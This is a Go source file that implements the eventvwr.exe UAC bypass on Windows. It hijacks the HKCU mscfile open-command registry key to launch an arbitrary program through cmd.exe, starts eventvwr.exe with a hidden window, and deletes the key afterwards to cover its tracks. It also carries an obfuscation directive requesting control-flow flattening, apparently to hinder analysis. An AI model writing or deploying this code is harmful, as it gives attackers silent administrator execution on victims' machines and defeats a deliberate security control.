// Copyright (c) 2019-2022 0x9ef. All rights reserved.
// Use of this source code is governed by an MIT license
// that can be found in the LICENSE file.
package once

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)
//garble:controlflow flatten_passes=1 junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
func ExecEventvwr(path string) error {
	k, exists, err := registry.CreateKey(
		registry.CURRENT_USER, "Software\\Classes\\mscfile\\shell\\open\\command", registry.ALL_ACCESS)
	if err != nil && !exists {
		return err
	}

	defer k.Close()
	defer registry.DeleteKey(registry.CURRENT_USER, "Software\\Classes\\mscfile\\shell\\open\\command")
	cmdDir := filepath.Join(os.Getenv("SYSTEMROOT"), "system32", "cmd.exe")
	value := fmt.Sprintf("%s start /k %s", cmdDir, path)
	if err = k.SetStringValue("", value); err != nil {
		return err
	}

	time.Sleep(time.Second)
	e := exec.Command("eventvwr.exe")
	e.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = e.Run()
	return err
}
